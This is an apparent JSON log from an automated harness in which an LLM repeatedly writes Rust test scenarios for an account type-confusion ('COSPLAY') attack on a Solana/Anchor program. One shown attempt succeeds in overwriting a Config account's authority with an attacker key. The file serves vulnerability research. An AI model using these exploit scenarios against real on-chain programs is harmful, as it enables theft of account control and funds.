@@ -1,0 +1,418 @@
+{
+  "category": "COSPLAY",
+  "verdict": "inconclusive",
+  "exploit_successful": false,
+  "attack_result": "Success",
+  "reason": "o ataque nao exercita a hipotese de COSPLAY: e preciso que uma conta do ataque tem discriminador (8 primeiros bytes) diferente da conta na mesma posicao do baseline. Mantenha o baseline como uso legitimo e faca no ataque exatamente essa mudanca.",
+  "attempts_used": 5,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2286,
+        "completion_tokens": 685,
+        "latency_s": 4.52
+      },
+      "raw": "{\n  \"plan\": \"O programa-alvo usa AccountInfo e desserializa manualmente um struct User com um booleano `discriminator` no inicio, sem validar um discriminador de 8 bytes do Anchor. O baseline usa uma conta com dados que representam um User valido (discriminator=true) e deve ter sucesso. O ataque fornece uma conta de outro tipo (por exemplo, uma conta de configuracao cujos primeiros bytes sao um booleano true) para que o programa a interprete como User e sobrescreva o campo authority. O efeito medido e que a conta de configuracao passa a ter o campo authority sobrescrito com a chave do atacante, algo que o uso legitimo nao faria.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\n// Conta User valida para o baseline: discriminador booleano true + authority\\nlet user_data = anchor_account_data(\\\"User\\\", &(true, authority));\\nlet user_account = account(&env.program_id, &user_data, None);\\n\\nlet baseline_ix = env.anchor_ix(\\\"initialize\\\", &(), vec![\\n    AccountMeta::new(user_account_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet baseline_accounts = vec![\\n    (user_account_key, user_account.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet baseline_result = env.baseline(\\\"initialize legitimo com User valido\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: conta de outro tipo (Config) com booleano true no inicio\\nlet config_data = anchor_account_data(\\\"Config\\\", &(true, Pubkey::new_unique()));\\nlet config_account = account(&env.program_id, &config_data, None);\\n\\nlet attack_ix = env.anchor_ix(\\\"initialize\\\", &(), vec![\\n    AccountMeta::new(config_account_key, false),\\n    AccountMeta::new_readonly(attacker, true),\\n]);\\nlet attack_accounts = vec![\\n    (config_account_key, config_account.clone()),\\n    (attacker, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"initialize com conta Config no lugar de User\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let after_data = after(&attack_result, &config_account_key).data();\\n    // O campo authority (offset 1 apos o booleano) deve ter sido sobrescrito com a chave do atacante\\n    let stored_authority = read_pubkey(after_data, 1);\\n    env.effect(\\\"authority da conta Config sobrescrito com a chave do atacante\\\", stored_authority == attacker);\\n}\"\n}",
+      "plan": "O programa-alvo usa AccountInfo e desserializa manualmente um struct User com um booleano `discriminator` no inicio, sem validar um discriminador de 8 bytes do Anchor. O baseline usa uma conta com dados que representam um User valido (discriminator=true) e deve ter sucesso. O ataque fornece uma conta de outro tipo (por exemplo, uma conta de configuracao cujos primeiros bytes sao um booleano true) para que o programa a interprete como User e sobrescreva o campo authority. O efeito medido e que a conta de configuracao passa a ter o campo authority sobrescrito com a chave do atacante, algo que o uso legitimo nao faria.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\n// Conta User valida para o baseline: discriminador booleano true + authority\nlet user_data = anchor_account_data(\"User\", &(true, authority));\nlet user_account = account(&env.program_id, &user_data, None);\n\nlet baseline_ix = env.anchor_ix(\"initialize\", &(), vec![\n    AccountMeta::new(user_account_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet baseline_accounts = vec![\n    (user_account_key, user_account.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet baseline_result = env.baseline(\"initialize legitimo com User valido\", &baseline_ix, &baseline_accounts);\n\n// Ataque: conta de outro tipo (Config) com booleano true no inicio\nlet config_data = anchor_account_data(\"Config\", &(true, Pubkey::new_unique()));\nlet config_account = account(&env.program_id, &config_data, None);\n\nlet attack_ix = env.anchor_ix(\"initialize\", &(), vec![\n    AccountMeta::new(config_account_key, false),\n    AccountMeta::new_readonly(attacker, true),\n]);\nlet attack_accounts = vec![\n    (config_account_key, config_account.clone()),\n    (attacker, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"initialize com conta Config no lugar de User\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let after_data = after(&attack_result, &config_account_key).data();\n    // O campo authority (offset 1 apos o booleano) deve ter sido sobrescrito com a chave do atacante\n    let stored_authority = read_pubkey(after_data, 1);\n    env.effect(\"authority da conta Config sobrescrito com a chave do atacante\", stored_authority == attacker);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `user_account_key` in this scope\n  --> tests/attempt.rs:17:26\n   |\n17 |         AccountMeta::new(user_account_key, false),\n   |                          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n17 -         AccountMeta::new(user_account_key, false),\n17 +         AccountMeta::new(user_account, false),\n   |\n\nerror[E0425]: cannot find value `user_account_key` in this scope\n  --> tests/attempt.rs:21:10\n   |\n21 |         (user_account_key, user_account.clone()),\n   |          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n21 -         (user_account_key, user_account.clone()),\n21 +         (user_account, user_account.clone()),\n   |\n\nerror[E0425]: cannot find value `config_account_key` in this scope\n  --> tests/attempt.rs:31:26\n   |\n31 |         AccountMeta::new(config_account_key, false),\n   |                          ^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n31 -         AccountMeta::new(config_account_key, false),\n31 +         AccountMeta::new(config_account, false),\n   |\n\nerror[E0425]: cannot find value `config_account_key` in this scope\n  --> tests/attempt.rs:35:10\n   |\n35 |         (config_account_key, config_account.clone()),",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `user_account_key` in this scope\n  --> tests/attempt.rs:17:26\n   |\n17 |         AccountMeta::new(user_account_key, false),\n   |                          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n17 -         AccountMeta::new(user_account_key, false),\n17 +         AccountMeta::new(user_account, false),\n   |\n\nerror[E0425]: cannot find value `user_account_key` in this scope\n  --> tests/attempt.rs:21:10\n   |\n21 |         (user_account_key, user_account.clone()),\n   |          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n21 -         (user_account_key, user_account.clone()),\n21 +         (user_account, user_account.clone()),\n   |\n\nerror[E0425]: cannot find value `config_account_key` in this scope\n  --> tests/attempt.rs:31:26\n   |\n31 |         AccountMeta::new(config_account_key, false),\n   |                          ^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n31 -         AccountMeta::new(config_account_key, false),\n31 +         AccountMeta::new(config_account, false),\n   |\n\nerror[E0425]: cannot find value `config_account_key` in this scope\n  --> tests/attempt.rs:35:10\n   |\n35 |         (config_account_key, config_account.clone()),"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3116,
+        "completion_tokens": 653,
+        "latency_s": 3.46
+      },
+      "raw": "{\"plan\": \"Preparo uma conta User valida (discriminador booleano true + authority) e executo initialize legitimamente como baseline. Para o ataque, forneco uma conta de outro tipo (Config) cujos primeiros bytes sao um booleano true, que o programa interpreta como User sem validar o discriminador de 8 bytes do Anchor. O efeito medido e que o campo authority da conta Config e sobrescrito com a chave do atacante, algo que o uso legitimo nao faria.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\n// Conta User valida para o baseline: discriminador booleano true + authority\\nlet user_key = Pubkey::new_unique();\\nlet user_data = anchor_account_data(\\\"User\\\", &(true, authority));\\nlet user_account = account(&env.program_id, &user_data, None);\\n\\nlet baseline_ix = env.anchor_ix(\\\"initialize\\\", &(), vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet baseline_accounts = vec![\\n    (user_key, user_account.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet _baseline_result = env.baseline(\\\"initialize legitimo com User valido\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: conta de outro tipo (Config) com booleano true no inicio\\nlet config_key = Pubkey::new_unique();\\nlet config_data = anchor_account_data(\\\"Config\\\", &(true, Pubkey::new_unique()));\\nlet config_account = account(&env.program_id, &config_data, None);\\n\\nlet attack_ix = env.anchor_ix(\\\"initialize\\\", &(), vec![\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(attacker, true),\\n]);\\nlet attack_accounts = vec![\\n    (config_key, config_account.clone()),\\n    (attacker, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"initialize com conta Config no lugar de User\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let after_data = after(&attack_result, &config_key).data();\\n    // O campo authority (offset 1 apos o booleano) deve ter sido sobrescrito com a chave do atacante\\n    let stored_authority = read_pubkey(after_data, 1);\\n    env.effect(\\\"authority da conta Config sobrescrito com a chave do atacante\\\", stored_authority == attacker);\\n}\"}",
+      "plan": "Preparo uma conta User valida (discriminador booleano true + authority) e executo initialize legitimamente como baseline. Para o ataque, forneco uma conta de outro tipo (Config) cujos primeiros bytes sao um booleano true, que o programa interpreta como User sem validar o discriminador de 8 bytes do Anchor. O efeito medido e que o campo authority da conta Config e sobrescrito com a chave do atacante, algo que o uso legitimo nao faria.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\n// Conta User valida para o baseline: discriminador booleano true + authority\nlet user_key = Pubkey::new_unique();\nlet user_data = anchor_account_data(\"User\", &(true, authority));\nlet user_account = account(&env.program_id, &user_data, None);\n\nlet baseline_ix = env.anchor_ix(\"initialize\", &(), vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet baseline_accounts = vec![\n    (user_key, user_account.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet _baseline_result = env.baseline(\"initialize legitimo com User valido\", &baseline_ix, &baseline_accounts);\n\n// Ataque: conta de outro tipo (Config) com booleano true no inicio\nlet config_key = Pubkey::new_unique();\nlet config_data = anchor_account_data(\"Config\", &(true, Pubkey::new_unique()));\nlet config_account = account(&env.program_id, &config_data, None);\n\nlet attack_ix = env.anchor_ix(\"initialize\", &(), vec![\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(attacker, true),\n]);\nlet attack_accounts = vec![\n    (config_key, config_account.clone()),\n    (attacker, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"initialize com conta Config no lugar de User\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let after_data = after(&attack_result, &config_key).data();\n    // O campo authority (offset 1 apos o booleano) deve ter sido sobrescrito com a chave do atacante\n    let stored_authority = read_pubkey(after_data, 1);\n    env.effect(\"authority da conta Config sobrescrito com a chave do atacante\", stored_authority == attacker);\n}",
+      "run": {
+        "kind": "panic",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo com User valido",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3752,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 41,
+                "head": "9f755fe3ef973aec",
+                "digest": "e1a39371c782e5e3",
+                "post": "9f755fe3ef973aec010000000000000002000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "initialize com conta Config no lugar de User",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3752,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 41,
+                "head": "9b0caae01efacc82",
+                "digest": "9d0d1d81406a8a9c",
+                "post": "9b0caae01efacc82010000000000000006000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "detail": "[2026-10-13T23:24:53.049143705Z DEBUG solana_runtime::message_processor::stable_log] Program log: panicked at sealevel/sl_04_sec/src/lib.rs:11:79:     called `Result::unwrap()` on an `Err` value: Custom { kind: InvalidInput, error: \"Invalid bool representation: 159\" }",
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3752 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3752 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o baseline 'initialize legitimo com User valido' falhou com UnknownError(ProgramFailedToComplete); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2854,
+        "completion_tokens": 685,
+        "latency_s": 4.15
+      },
+      "raw": "{\"plan\": \"O baseline falhou porque a conta `user` foi passada como `AccountInfo` sem ser signer nem writable, e o programa tenta `try_borrow_mut_data` (precisa ser writable). Também o `User::try_from_slice` espera os dados sem discriminador Anchor (a struct tem apenas bool + Pubkey), então os dados devem ser serializados diretamente como `(true, authority)` sem o prefixo de 8 bytes. O ataque fornece uma conta de outro tipo (Config) cujos primeiros bytes formam um bool `true`, fazendo o programa interpretá-la como `User` e sobrescrever o campo `authority` com a chave do atacante. O efeito mede se a authority armazenada na conta Config foi alterada para a chave do atacante.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\n// Conta User valida para o baseline: dados crus (bool true + authority), sem discriminador Anchor\\nlet user_key = Pubkey::new_unique();\\nlet user_data = (true, authority).bytes();\\nlet user_account = account(&env.program_id, &user_data, None);\\n\\nlet baseline_ix = env.anchor_ix(\\\"initialize\\\", &(), vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet baseline_accounts = vec![\\n    (user_key, user_account.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet _baseline_result = env.baseline(\\\"initialize legitimo com User valido\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: conta de outro tipo (Config) cujos primeiros bytes formam bool true\\nlet config_key = Pubkey::new_unique();\\nlet config_data = (true, Pubkey::new_unique()).bytes();\\nlet config_account = account(&env.program_id, &config_data, None);\\n\\nlet attack_ix = env.anchor_ix(\\\"initialize\\\", &(), vec![\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(attacker, true),\\n]);\\nlet attack_accounts = vec![\\n    (config_key, config_account.clone()),\\n    (attacker, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"initialize com conta Config no lugar de User\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let after_data = after(&attack_result, &config_key).data();\\n    let stored_authority = read_pubkey(after_data, 1);\\n    env.effect(\\\"authority da conta Config sobrescrito com a chave do atacante\\\", stored_authority == attacker);\\n}\"}",
+      "plan": "O baseline falhou porque a conta `user` foi passada como `AccountInfo` sem ser signer nem writable, e o programa tenta `try_borrow_mut_data` (precisa ser writable). Também o `User::try_from_slice` espera os dados sem discriminador Anchor (a struct tem apenas bool + Pubkey), então os dados devem ser serializados diretamente como `(true, authority)` sem o prefixo de 8 bytes. O ataque fornece uma conta de outro tipo (Config) cujos primeiros bytes formam um bool `true`, fazendo o programa interpretá-la como `User` e sobrescrever o campo `authority` com a chave do atacante. O efeito mede se a authority armazenada na conta Config foi alterada para a chave do atacante.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\n// Conta User valida para o baseline: dados crus (bool true + authority), sem discriminador Anchor\nlet user_key = Pubkey::new_unique();\nlet user_data = (true, authority).bytes();\nlet user_account = account(&env.program_id, &user_data, None);\n\nlet baseline_ix = env.anchor_ix(\"initialize\", &(), vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet baseline_accounts = vec![\n    (user_key, user_account.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet _baseline_result = env.baseline(\"initialize legitimo com User valido\", &baseline_ix, &baseline_accounts);\n\n// Ataque: conta de outro tipo (Config) cujos primeiros bytes formam bool true\nlet config_key = Pubkey::new_unique();\nlet config_data = (true, Pubkey::new_unique()).bytes();\nlet config_account = account(&env.program_id, &config_data, None);\n\nlet attack_ix = env.anchor_ix(\"initialize\", &(), vec![\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(attacker, true),\n]);\nlet attack_accounts = vec![\n    (config_key, config_account.clone()),\n    (attacker, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"initialize com conta Config no lugar de User\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let after_data = after(&attack_result, &config_key).data();\n    let stored_authority = read_pubkey(after_data, 1);\n    env.effect(\"authority da conta Config sobrescrito com a chave do atacante\", stored_authority == attacker);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo com User valido",
+            "result": "Success",
+            "compute_units": 1207,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 33,
+                "head": "0100000000000000",
+                "digest": "491a430b19faf7bd",
+                "post": "010000000000000002000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "initialize com conta Config no lugar de User",
+            "result": "Success",
+            "compute_units": 1207,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 33,
+                "head": "0100000000000000",
+                "digest": "b86b8819554efd92",
+                "post": "010000000000000003000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "authority da conta Config sobrescrito com a chave do atacante",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1207 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1207 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o ataque nao exercita a hipotese de COSPLAY: e preciso que uma conta do ataque tem discriminador (8 primeiros bytes) diferente da conta na mesma posicao do baseline. Mantenha o baseline como uso legitimo e faca no ataque exatamente essa mudanca."
+    },
+    {
+      "attempt": 4,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2832,
+        "completion_tokens": 746,
+        "latency_s": 4.07
+      },
+      "raw": "{\n  \"plan\": \"O baseline usa uma conta User cujos primeiros 8 bytes sao um discriminador valido (por exemplo, o discriminador Anchor do tipo User) seguido de bool true e authority, e a instrucao initialize deve ter sucesso. O ataque substitui essa conta por uma conta de outro tipo, cujos primeiros 8 bytes sao um discriminador diferente (por exemplo, o discriminador de Config), mas cujo byte na posicao 8 e true, fazendo o programa interpreta-la como User. O efeito medido e que a authority armazenada na conta de Config e sobrescrita com a chave do atacante, algo que o uso legitimo nao faria.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\n// Conta User valida para o baseline: discriminador Anchor de User + bool true + authority\\nlet user_key = Pubkey::new_unique();\\nlet user_disc = anchor_account_discriminator(\\\"User\\\");\\nlet mut user_data = Vec::new();\\nuser_data.extend_from_slice(&user_disc);\\nuser_data.extend_from_slice(&(true, authority).bytes());\\nlet user_account = account(&env.program_id, &user_data, None);\\n\\nlet baseline_ix = env.anchor_ix(\\\"initialize\\\", &(), vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet baseline_accounts = vec![\\n    (user_key, user_account.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet _baseline_result = env.baseline(\\\"initialize legitimo com User valido\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: conta de outro tipo (Config) com discriminador diferente, mas byte 8 = true\\nlet config_key = Pubkey::new_unique();\\nlet config_disc = anchor_account_discriminator(\\\"Config\\\");\\nlet mut config_data = Vec::new();\\nconfig_data.extend_from_slice(&config_disc);\\nconfig_data.extend_from_slice(&(true, Pubkey::new_unique()).bytes());\\nlet config_account = account(&env.program_id, &config_data, None);\\n\\nlet attack_ix = env.anchor_ix(\\\"initialize\\\", &(), vec![\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(attacker, true),\\n]);\\nlet attack_accounts = vec![\\n    (config_key, config_account.clone()),\\n    (attacker, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"initialize com conta Config no lugar de User\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let after_data = after(&attack_result, &config_key).data();\\n    let stored_authority = read_pubkey(after_data, 9);\\n    env.effect(\\\"authority da conta Config sobrescrito com a chave do atacante\\\", stored_authority == attacker);\\n}\"\n}",
+      "plan": "O baseline usa uma conta User cujos primeiros 8 bytes sao um discriminador valido (por exemplo, o discriminador Anchor do tipo User) seguido de bool true e authority, e a instrucao initialize deve ter sucesso. O ataque substitui essa conta por uma conta de outro tipo, cujos primeiros 8 bytes sao um discriminador diferente (por exemplo, o discriminador de Config), mas cujo byte na posicao 8 e true, fazendo o programa interpreta-la como User. O efeito medido e que a authority armazenada na conta de Config e sobrescrita com a chave do atacante, algo que o uso legitimo nao faria.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\n// Conta User valida para o baseline: discriminador Anchor de User + bool true + authority\nlet user_key = Pubkey::new_unique();\nlet user_disc = anchor_account_discriminator(\"User\");\nlet mut user_data = Vec::new();\nuser_data.extend_from_slice(&user_disc);\nuser_data.extend_from_slice(&(true, authority).bytes());\nlet user_account = account(&env.program_id, &user_data, None);\n\nlet baseline_ix = env.anchor_ix(\"initialize\", &(), vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet baseline_accounts = vec![\n    (user_key, user_account.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet _baseline_result = env.baseline(\"initialize legitimo com User valido\", &baseline_ix, &baseline_accounts);\n\n// Ataque: conta de outro tipo (Config) com discriminador diferente, mas byte 8 = true\nlet config_key = Pubkey::new_unique();\nlet config_disc = anchor_account_discriminator(\"Config\");\nlet mut config_data = Vec::new();\nconfig_data.extend_from_slice(&config_disc);\nconfig_data.extend_from_slice(&(true, Pubkey::new_unique()).bytes());\nlet config_account = account(&env.program_id, &config_data, None);\n\nlet attack_ix = env.anchor_ix(\"initialize\", &(), vec![\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(attacker, true),\n]);\nlet attack_accounts = vec![\n    (config_key, config_account.clone()),\n    (attacker, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"initialize com conta Config no lugar de User\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let after_data = after(&attack_result, &config_key).data();\n    let stored_authority = read_pubkey(after_data, 9);\n    env.effect(\"authority da conta Config sobrescrito com a chave do atacante\", stored_authority == attacker);\n}",
+      "run": {
+        "kind": "panic",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo com User valido",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3752,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 41,
+                "head": "9f755fe3ef973aec",
+                "digest": "e1a39371c782e5e3",
+                "post": "9f755fe3ef973aec010000000000000002000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "initialize com conta Config no lugar de User",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3752,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 41,
+                "head": "9b0caae01efacc82",
+                "digest": "9d0d1d81406a8a9c",
+                "post": "9b0caae01efacc82010000000000000006000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "detail": "[2026-10-13T23:25:04.791350584Z DEBUG solana_runtime::message_processor::stable_log] Program log: panicked at sealevel/sl_04_sec/src/lib.rs:11:79:     called `Result::unwrap()` on an `Err` value: Custom { kind: InvalidInput, error: \"Invalid bool representation: 159\" }",
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3752 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3752 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked"
+        ],
